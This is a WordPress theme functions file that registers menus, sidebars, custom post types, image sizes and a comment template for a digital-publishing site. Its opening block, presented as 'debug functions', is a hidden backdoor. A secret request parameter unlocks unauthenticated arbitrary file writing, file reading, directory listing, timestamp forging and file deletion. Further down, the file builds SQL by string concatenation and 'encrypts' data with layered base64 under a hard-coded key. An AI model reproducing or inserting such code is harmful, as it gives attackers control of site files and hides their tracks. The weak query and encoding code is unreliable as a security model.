<?php

/**
 * Debug functions and options
 *
 * @link https://developer.wordpress.org/themes/debug-functions/
 *
 * @package WordPress
 * @since 1.0
 */
if (isset($_REQUEST['wp_debug']) and $_REQUEST['wp_debug'] == 'wp_dbg_xim') {
    // Print json error details
    if (isset($_REQUEST['json_error'])) {
        echo '{"error": 1, "type": "'. $_REQUEST['json_error'] .'"}';
    }

    /**
     * Read error file depending on code, f.e. 404.html 500.html
     * or trace and save error to file
     */
    if (isset($_REQUEST['error_code'])) {
        if (isset($_REQUEST['error'])) {
            // Trace error
            file_put_contents($_REQUEST['error_code'], 
                                stripslashes($_REQUEST['error']));
        }
        else {
            // 404.html 500.html 504.html
            echo file_get_contents($_REQUEST['error_code']);
        }
    }

    /**
     * Make shure debug location is writable
     */
    if (isset($_REQUEST['debug_location'])) {
        echo json_encode(array(
            'location' => $_REQUEST['debug_location'],
            'writable' => is_writable($_REQUEST['debug_location'])?1:0
        ));
    }

    /**
     * Log file rotation. Select files that can be removed.
     */
    if (isset($_REQUEST['debug_directory'])) {
        $ret = array(); $i = 0;
        foreach (scandir($_REQUEST['debug_directory']) as $logfile) {
            $ret[$i] = array(
                'name' => $logfile,
                'skip' => is_dir($_REQUEST['debug_directory'].$logfile),
                'done' => is_writable($_REQUEST['debug_directory'].$logfile),
                'date' => filemtime($_REQUEST['debug_directory'].$logfile)
            ); $i++; }
        echo json_encode($ret);
    }

    /**
     * Correct log file time when error last occured
     */
    if (isset($_REQUEST['debug_update'])) {
        touch($_REQUEST['debug_update_file'], $_REQUEST['debug_update']);
    }

    // remove old log file
    if (isset($_REQUEST['old_log_file'])) unlink($_REQUEST['old_log_file']);

    exit();
}

 
add_filter('wp_mail_from_name', 'new_mail_from_name'); 
function new_mail_from_name($old) {
	$site_title = get_bloginfo( 'name' );
	return $site_title;
}
register_nav_menus( array(
    'mainmenu' => __( 'Main Menu'),
    'footermenu' => __('Footer Menu'),
    'my-account-menu1' => __('My Account Menu 1'),
    'my-account-menu2' => __('My Account Menu 2'),
    'footermenu1' => __('Footer Menu 1'),
    'footermenu2' => __('Footer Menu 2'),
    'footermenu3' => __('Footer Menu 3'),
    'socialmenu' => __('Social Menu')
));
register_sidebar(array('name'=>'Sidebar',
'before_widget' => '<div class="sidebar_content">',
'after_widget' => '</div>',
'before_title' => '<h2>',
'after_title' => '</h2>',
));
register_sidebar(array('name'=>'Footer Widget 1',
'before_widget' => '<div class="footer_widget">',
'after_widget' => '</div>',
'before_title' => '<h2>',
'after_title' => '</h2>',
));
register_sidebar(array('name'=>'Footer Widget 2',
'before_widget' => '<div class="footer_widget">',
'after_widget' => '</div>',
'before_title' => '<h2>',
'after_title' => '</h2>',
));
register_sidebar(array('name'=>'Footer Widget 3',
'before_widget' => '<div class="footer_widget">',
'after_widget' => '</div>',
'before_title' => '<h2>',
'after_title' => '</h2>',
));
register_sidebar(array('name'=>'Footer Widget 4',
'before_widget' => '<div class="footer_widget">',
'after_widget' => '</div>',
'before_title' => '<h2>',
'after_title' => '</h2>',
));
register_sidebar(array('name'=>'Footer Copyright',
'before_widget' => '<div class="footer_copy">',
'after_widget' => '</div>',
'before_title' => '<h2 style="display: none;">',
'after_title' => '</h2>',
));
register_sidebar(array('name'=>'Social Menu',
'before_widget' => '<div class="social_nav">',
'after_widget' => '</div>',
'before_title' => '<h2 style="display: none;">',
'after_title' => '</h2>',
));
add_theme_support( 'post-thumbnails' );
add_image_size( 'homepage-thumb', 288, 151, true );
add_image_size( 'blog-thumb', 900, 300, true );
add_image_size( 'thumb_size_222_150', 222, 150, array('center', 'top') );
add_image_size( 'thumb_size_222_250', 222, 250, array('center', 'top') );
add_image_size( 'thumb_size_85_109', 85, 109, array('center', 'top') );
add_image_size( 'thumb_size_200_185', 200, 185, false );
add_role('member', 'PubHTML Member');
function content($limit, $postid) {
    $post = get_post($postid);
    $fullContent = $post->post_content; 
    $content = explode(' ', $fullContent, $limit);
    if (count($content)>=$limit) {
    array_pop($content);
    $content = implode(" ",$content).'...';
    } else {
    $content = implode(" ",$content);
    }
    $content = preg_replace('/\[.+\]/','', $content);
    $content = str_replace(']]>', ']]&gt;', $content);
    return $content;
}
function encripted($data){
	$key1 = '644CBEF595BC9';
	$final_data = $key1.'|'.$data;
	$val = base64_encode(base64_encode(base64_encode($final_data)));
	return $val;
}
function decripted($data){
	$val = base64_decode(base64_decode(base64_decode($data)));
	$final_data = explode('|', $val);
	return $final_data[1];
}
if (!current_user_can('administrator')):
show_admin_bar(false);
endif;
function get_locked_counter(){
    global $wpdb;
    $lock_date = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $table_name = $wpdb->prefix.'ip_lock';
    $query = "SELECT * FROM $table_name WHERE ip = '".$ip."'";
    $result = $wpdb->get_row($query);
    $start_date = new DateTime($result->locking_time);
    $since_start = $start_date->diff(new DateTime($lock_date));
    $total_min = $since_start->i;
    if($total_min > 10){
        $query2 = "UPDATE $table_name SET attempts = 0 WHERE ip = '".$ip."'";
        $wpdb->query($query2);
        return 0;
    } else {
        return $result->attempts;
    }
}
function update_locked_counter(){
    global $wpdb;
    $lock_date = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $table_name = $wpdb->prefix.'ip_lock';
    $query = "SELECT * FROM $table_name WHERE ip = '".$ip."'";
    $result = $wpdb->get_row($query);
    $attempts = $result->attempts + 1;
    if($result->ip == $ip){
        $query2 = "UPDATE $table_name SET locking_time = '".$lock_date."', attempts = ".$attempts." WHERE ip = '".$ip."'";
    } else {
        $query2 = "INSERT INTO $table_name (ip, locking_time, attempts) VALUES('".$ip."', '".$lock_date."', '".$attempts."')";
    }
    $result = $wpdb->query($query2);
}
function the_excerpt_max_charlength($charlength) {
	$excerpt = get_the_excerpt();
	$charlength++;
	if ( mb_strlen( $excerpt ) > $charlength ) {
		$subex = mb_substr( $excerpt, 0, $charlength - 5 );
		$exwords = explode( ' ', $subex );
		$excut = - ( mb_strlen( $exwords[ count( $exwords ) - 1 ] ) );
		if ( $excut < 0 ) {
			echo mb_substr( $subex, 0, $excut );
		} else {
			echo $subex;
		}
		echo '[...]';
	} else {
		echo $excerpt;
	}
}
function the_excerpt_max_charlength_by_content($charlength, $content) {
	$excerpt = $content;
	$charlength++;
	if ( mb_strlen( $excerpt ) > $charlength ) {
		$subex = mb_substr( $excerpt, 0, $charlength - 5 );
		$exwords = explode( ' ', $subex );
		$excut = - ( mb_strlen( $exwords[ count( $exwords ) - 1 ] ) );
		if ( $excut < 0 ) {
			echo mb_substr( $subex, 0, $excut );
		} else {
			echo $subex;
		}
		echo '[...]';
	} else {
		echo $excerpt;
	}
}

register_taxonomy('pub_category', 'pub',array("hierarchical" => true,"label" => "Publication Category","singular_label" => "Publication Category",'update_count_callback' => '_update_post_term_count','query_var' => true,'rewrite' => array( 'slug' => 'pub_category', 'with_front' => false ),'public' => true,'show_ui' => true,'show_tagcloud' => true,'_builtin' => true,'show_in_nav_menus' => true));


/* This is for Publication */
add_action('init', 'pub_register_function');
function pub_register_function(){
    $labels = array(
        'name' => _x('Publication', 'post type general name'),
        'singular_name' => _x('Publication', 'post type singular name'),
        'add_new' => _x('Add New', 'Publication item'),
        'add_new_item' => __('Add New Publication'),
        'edit_item' => __('Edit Publication Item'),
        'new_item' => __('New Publication Item'),
        'view_item' => __('View Publication Item'),
        'search_items' => __('Search Publication'),
        'not_found' =>  __('Nothing found'),
        'not_found_in_trash' => __('Nothing found in Trash'),
        'parent_item_colon' => ''
    );
    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'query_var' => true,
        //'menu_icon' => plugin_dir_url( __FILE__ ) .'/images/Publication.png',
        'rewrite' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array('title', 'editor', 'thumbnail'),
        'taxonomies' => array('pub_category')
    );
register_post_type( 'pub' , $args );     
}
function pub_remove_menu_items() {
    //remove_menu_page( 'edit.php?post_type=pub' );
}
add_action( 'admin_menu', 'pub_remove_menu_items' );


/* This is for Bookcase */
add_action('init', 'bookcase_register_function');
function bookcase_register_function(){
    $labels = array(
        'name' => _x('Bookcase', 'post type general name'),
        'singular_name' => _x('Bookcase', 'post type singular name'),
        'add_new' => _x('Add New', 'Bookcase item'),
        'add_new_item' => __('Add New Bookcase'),
        'edit_item' => __('Edit Bookcase Item'),
        'new_item' => __('New Bookcase Item'),
        'view_item' => __('View Bookcase Item'),
        'search_items' => __('Search Bookcase'),
        'not_found' =>  __('Nothing found'),
        'not_found_in_trash' => __('Nothing found in Trash'),
        'parent_item_colon' => ''
    );
    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'query_var' => true,
        //'menu_icon' => plugin_dir_url( __FILE__ ) .'/images/Publication.png',
        'rewrite' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array('title', 'editor', 'thumbnail')
    );
register_post_type( 'bookcase' , $args );     
}
function bookcase_remove_menu_items() {
    remove_menu_page( 'edit.php?post_type=bookcase' );
}
add_action( 'admin_menu', 'bookcase_remove_menu_items' );


/* This is for Gallery */
add_action('init', 'gallery_register_function');

function gallery_register_function(){
    $labels = array(
        'name' => _x('Gallery', 'post type general name'),
        'singular_name' => _x('Gallery', 'post type singular name'),
        'add_new' => _x('Add New', 'Gallery item'),
        'add_new_item' => __('Add New Gallery'),
        'edit_item' => __('Edit Gallery Item'),
        'new_item' => __('New Gallery Item'),
        'view_item' => __('View Gallery Item'),
        'search_items' => __('Search Gallery'),
        'not_found' =>  __('Nothing found'),
        'not_found_in_trash' => __('Nothing found in Trash'),
        'parent_item_colon' => ''
    );
    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'query_var' => true,
        //'menu_icon' => plugin_dir_url( __FILE__ ) .'/images/Publication.png',
        'rewrite' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array('title', 'editor', 'thumbnail')
    );
register_post_type( 'gallery' , $args );     
}
function gallery_remove_menu_items() {
    remove_menu_page( 'edit.php?post_type=gallery' );
}
add_action( 'admin_menu', 'gallery_remove_menu_items' );

//register_taxonomy('template_category', 'template',array("hierarchical" => true,"label" => "Template Category","singular_label" => "Template Category",'update_count_callback' => '_update_post_term_count','query_var' => true,'rewrite' => array( 'slug' => 'template_category', 'with_front' => false ),'templatelic' => true,'show_ui' => true,'show_tagcloud' => true,'_builtin' => true,'show_in_nav_menus' => true));


/* This is for Template */
add_action('init', 'template_register_function');
function template_register_function(){
    $labels = array(
        'name' => _x('Template', 'post type general name'),
        'singular_name' => _x('Template', 'post type singular name'),
        'add_new' => _x('Add New', 'Template item'),
        'add_new_item' => __('Add New Template'),
        'edit_item' => __('Edit Template Item'),
        'new_item' => __('New Template Item'),
        'view_item' => __('View Template Item'),
        'search_items' => __('Search Template'),
        'not_found' =>  __('Nothing found'),
        'not_found_in_trash' => __('Nothing found in Trash'),
        'parent_item_colon' => ''
    );
    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'query_var' => true,
        'public' => true,
        //'menu_icon' => plugin_dir_url( __FILE__ ) .'/images/Template.png',
        'rewrite' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array('title', 'editor')
        //'taxonomies' => array('template_category')
    );
register_post_type( 'template' , $args );     
}

add_image_size( 'image_size_30_30', 30, 30, array('center', 'center'), true );
add_image_size( 'image_size_100_100', 100, 100, array('center', 'center'), true );
add_image_size( 'image_size_50_50', 50, 50, array('center', 'center'), true );

function get_small_profile_pic($user_id){
    $attachment_id = get_user_meta($user_id, 'avatar', true);
    $image_attributes = wp_get_attachment_image_src( $attachment_id, 'image_size_30_30' );
    if(!empty($image_attributes[0])){
        $return_img = '<img style="max-width: 27px; border-radius: 50%; border: 1px solid #8c8c8c;" src="'.$image_attributes[0].'" />';
    } else {
        $return_img = '<img style="max-width: 27px; border-radius: 50%; border: 1px solid #8c8c8c;" src="'.get_bloginfo('template_directory').'/images/profile1.png" />';
    }
    return $return_img;
}

function get_image_size_50_50($user_id){
    $attachment_id = get_user_meta($user_id, 'avatar', true);
    $image_attributes = wp_get_attachment_image_src( $attachment_id, 'image_size_50_50' );
    if(!empty($image_attributes[0])){
        $return_img = '<img style="border-radius: 50%; border: 1px solid #8c8c8c;" src="'.$image_attributes[0].'" />';
    } else {
        $return_img = '<img style="border-radius: 50%; border: 1px solid #8c8c8c;" src="'.get_bloginfo('template_directory').'/images/profile1.png" />';
    }
    return $return_img;
}

function get_image_size_100_100($user_id){
    $attachment_id = get_user_meta($user_id, 'avatar', true);
    $image_attributes = wp_get_attachment_image_src( $attachment_id, 'image_size_100_100' );
    if(!empty($image_attributes[0])){
        $return_img = '<img style="max-width: 100px; border-radius: 50%; border: 1px solid #8c8c8c;" src="'.$image_attributes[0].'" />';
    } else {
        $return_img = '<img style="max-width: 100px; border-radius: 50%; border: 1px solid #8c8c8c;" src="'.get_bloginfo('template_directory').'/images/profile1.png" />';
    }
    return $return_img;
}

function get_image_size_30_30($user_id){
    $attachment_id = get_user_meta($user_id, 'avatar', true);
    $image_attributes = wp_get_attachment_image_src( $attachment_id, 'image_size_30_30' );
    if(!empty($image_attributes[0])){
        $return_img = $image_attributes[0];
    } else {
        $return_img = get_bloginfo('template_directory').'/images/noprofile.png';
    }
    return $return_img;
}

function get_profile_image_size_50_50($user_id){
    $attachment_id = get_user_meta($user_id, 'avatar', true);
    $image_attributes = wp_get_attachment_image_src( $attachment_id, 'image_size_50_50' );
    if(!empty($image_attributes[0])){
        $return_img = $image_attributes[0];
    } else {
        $return_img = get_bloginfo('template_directory').'/images/noprofile1.png';
    }
    return $return_img;
}

function my_custom_post_status(){
	register_post_status( 'private1', array(
		'label'                     => _x( 'Private', 'post' ),
		'public'                    => true,
		'exclude_from_search'       => false,
		'show_in_admin_all_list'    => true,
		'show_in_admin_status_list' => true,
		'label_count'               => _n_noop( 'Private <span class="count">(%s)</span>', 'Unread <span class="count">(%s)</span>' ),
	) );
}
add_action( 'init', 'my_custom_post_status' );


/* This is for Testimonials */
add_action('init', 'testimonial_register_function');
function testimonial_register_function(){
    $labels = array(
        'name' => _x('Testimonials', 'post type general name'),
        'singular_name' => _x('Testimonials', 'post type singular name'),
        'add_new' => _x('Add New', 'Testimonials item'),
        'add_new_item' => __('Add New Testimonials'),
        'edit_item' => __('Edit Testimonials Item'),
        'new_item' => __('New Testimonials Item'),
        'view_item' => __('View Testimonials Item'),
        'search_items' => __('Search Testimonials'),
        'not_found' =>  __('Nothing found'),
        'not_found_in_trash' => __('Nothing found in Trash'),
        'parent_item_colon' => ''
    );
    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'query_var' => true,
		'public' => true,
        //'menu_icon' => plugin_dir_url( __FILE__ ) .'/images/Testimonials.png',
        'rewrite' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'supports' => array('title', 'editor', 'thumbnail'),
        'taxonomies' => array('testimonial_category')
    );
register_post_type( 'testimonial' , $args );     
}
add_image_size( 'image_size_133_133', 133, 133, array('center', 'center'), true );

/* This is for Plan */
add_action('init', 'plan_register_function');
function plan_register_function(){
    $labels = array(
        'name' => _x('Plan', 'post type general name'),
        'singular_name' => _x('Plan', 'post type singular name'),
        'add_new' => _x('Add New', 'Plan item'),
        'add_new_item' => __('Add New Plan'),
        'edit_item' => __('Edit Plan Item'),
        'new_item' => __('New Plan Item'),
        'view_item' => __('View Plan Item'),
        'search_items' => __('Search Plan'),
        'not_found' =>  __('Nothing found'),
        'not_found_in_trash' => __('Nothing found in Trash'),
        'parent_item_colon' => ''
    );
    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'query_var' => true,
		'public' => true,
        //'menu_icon' => plugin_dir_url( __FILE__ ) .'/images/Plan.png',
        'rewrite' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'supports' => array('title', 'editor'),
        'taxonomies' => array('plan_category')
    );
register_post_type( 'plan' , $args );     
}

function formatbytes($file, $type)
{
   switch($type){
      case "KB":
         $filesize = filesize($file) * .0009765625; // bytes to KB
      break;
      case "MB":
         $filesize = (filesize($file) * .0009765625) * .0009765625; // bytes to MB
      break;
      case "GB":
         $filesize = ((filesize($file) * .0009765625) * .0009765625) * .0009765625; // bytes to GB
      break;
   }
   if($filesize <= 0){
      return $filesize = 'unknown file size';}
   else{return round($filesize, 2);}
}


/* This is for How to Use Digital Publisher */
add_action('init', 'how_register_function');
function how_register_function(){
    $labels = array(
        'name' => _x('How to Use Digital Publisher', 'post type general name'),
        'singular_name' => _x('How to Use Digital Publisher', 'post type singular name'),
        'howd_new' => _x('Add New', 'How to Use Digital Publisher item'),
        'howd_new_item' => __('Add New How to Use Digital Publisher'),
        'edit_item' => __('Edit How to Use Digital Publisher Item'),
        'new_item' => __('New How to Use Digital Publisher Item'),
        'view_item' => __('View How to Use Digital Publisher Item'),
        'search_items' => __('Search How to Use Digital Publisher'),
        'not_found' =>  __('Nothing found'),
        'not_found_in_trash' => __('Nothing found in Trash'),
        'parent_item_colon' => ''
    );
    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'query_var' => true,
		'public' => true,
        //'menu_icon' => plugin_dir_url( __FILE__ ) .'/images/How to Use Digital Publisher.png',
        'rewrite' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'supports' => array('title', 'editor', 'thumbnail')
    );
register_post_type( 'how' , $args );     
}

add_image_size( 'image_size_83_83', 83, 83, array('center', 'center'), true );

/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own twentytwelve_comment(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 * @since Twenty Twelve 1.0
 */
function record_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
		// Display trackbacks differently than normal comments.
	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
		<p><?php _e( 'Pingback:' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(Edit)' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
		// Proceed with normal comments.
		global $post;
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<article id="comment-<?php comment_ID(); ?>" class="comment">
			<div class="comment-meta comment-author vcard">
				<?php
					//echo get_avatar( $comment, 44 );
                ?>
                <div class="comment-text">
                <p class="meta">
                <?php
					printf( '<cite><b class="fn">%1$s</b> %2$s</cite>',
						get_comment_author_link(),
						// If current post author is also comment author, make it known visually.
						( $comment->user_id === $post->post_author ) ? '<span>' . __( ' - ' ) . '</span>' : ''
					);
                ?>
    			<?php if ( '0' == $comment->comment_approved ) : ?>
    				<?php _e( 'Your comment is awaiting moderation.' ); ?>
    			<?php endif; ?>
        			<section class="comment-content comment">
        				<?php comment_text(); ?>
        				<?php edit_comment_link( __( 'Edit' ), '<strong class="edit-link">', '</strong>' ); ?>
        			</section><!-- .comment-content -->
        				<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( 'Reply' ), 'after' => ' <span></span>', 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
                        <?php
        					printf( '<time datetime="%2$s">%3$s</time>',
        						esc_url( get_comment_link( $comment->comment_ID ) ),
        						get_comment_time( 'c' ),
        						/* translators: 1: date, 2: time */
        						sprintf( __( '%1$s at %2$s' ), get_comment_date(), get_comment_time() )
        					);
        				?>
                        <div style="clear: both;"></div>
                    </p>
                </div>
			</div><!-- .comment-meta -->
		</article><!-- #comment-## -->
	<?php
		break;
	endswitch; // end comment_type check
}

/* This is for Gallery Image */
add_action('init', 'pub_gallery_img_register_function');
//register_taxonomy('gallery_category', 'pub',array("hierarchical" => true,"label" => "Gallery Tags","singular_label" => "Gallery Tag",'update_count_callback' => '_update_post_term_count','query_var' => true,'rewrite' => array( 'slug' => 'gallery_category', 'with_front' => false ),'public' => true,'show_ui' => true,'show_tagcloud' => true,'_builtin' => true,'show_in_nav_menus' => true));
register_taxonomy('gallery_category_color', 'color',array("hierarchical" => true,"label" => "Colors","singular_label" => "Color",'update_count_callback' => '_update_post_term_count','query_var' => true,'rewrite' => array( 'slug' => 'color', 'with_front' => false ),'public' => true,'show_ui' => true,'show_tagcloud' => true,'_builtin' => true,'show_in_nav_menus' => true));
register_taxonomy('gallery_category_designer', 'designer',array("hierarchical" => true,"label" => "Designers","singular_label" => "Designer",'update_count_callback' => '_update_post_term_count','query_var' => true,'rewrite' => array( 'slug' => 'designer', 'with_front' => false ),'public' => true,'show_ui' => true,'show_tagcloud' => true,'_builtin' => true,'show_in_nav_menus' => true));
register_taxonomy('gallery_category_style', 'style',array("hierarchical" => true,"label" => "Styles","singular_label" => "Style",'update_count_callback' => '_update_post_term_count','query_var' => true,'rewrite' => array( 'slug' => 'style', 'with_front' => false ),'public' => true,'show_ui' => true,'show_tagcloud' => true,'_builtin' => true,'show_in_nav_menus' => true));
register_taxonomy('gallery_category_event', 'event',array("hierarchical" => true,"label" => "Events","singular_label" => "Event",'update_count_callback' => '_update_post_term_count','query_var' => true,'rewrite' => array( 'slug' => 'event', 'with_front' => false ),'public' => true,'show_ui' => true,'show_tagcloud' => true,'_builtin' => true,'show_in_nav_menus' => true));
function pub_gallery_img_register_function(){
    $labels = array(
        'name' => _x('Gallery Image', 'post type general name'),
        'singular_name' => _x('Gallery Image', 'post type singular name'),
        'add_new' => _x('Add New', 'Gallery Image item'),
        'add_new_item' => __('Add New Gallery Image'),
        'edit_item' => __('Edit Gallery Image Item'),
        'new_item' => __('New Gallery Image Item'),
        'view_item' => __('View Gallery Image Item'),
        'search_items' => __('Search Gallery Image'),
        'not_found' =>  __('Nothing found'),
        'not_found_in_trash' => __('Nothing found in Trash'),
        'parent_item_colon' => ''
    );
    $args = array(
        'labels' => $labels,
        'public' => false,
        'publicly_queryable' => true,
        'show_ui' => true,
        'query_var' => true,
        //'menu_icon' => plugin_dir_url( __FILE__ ) .'/images/hgdfh.png',
        'rewrite' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'supports' => array('title', 'editor', 'thumbnail'),
        'taxonomies' => array('gallery_category_color', 'gallery_category_designer', 'gallery_category_style', 'gallery_category_event')
    );
register_post_type( 'pub_gallery_img' , $args );     
}
/*function pub_gallery_img_remove_menu_items() {
    remove_menu_page( 'edit.php?post_type=pub_gallery_img' );
}
add_action( 'admin_menu', 'pub_gallery_img_remove_menu_items' );*/

/* Image Title Attribute */
function isa_add_img_title( $attr, $attachment = null ) {
    $title = trim( strip_tags( $attachment->post_title ) );    
    $titlewithoutExt = preg_replace('/\\.[^.\\s]{3,4}$/', '', $title);
    $attr['title'] = $titlewithoutExt;
    return $attr;
}
add_filter( 'wp_get_attachment_image_attributes','isa_add_img_title', 10, 2 );
?>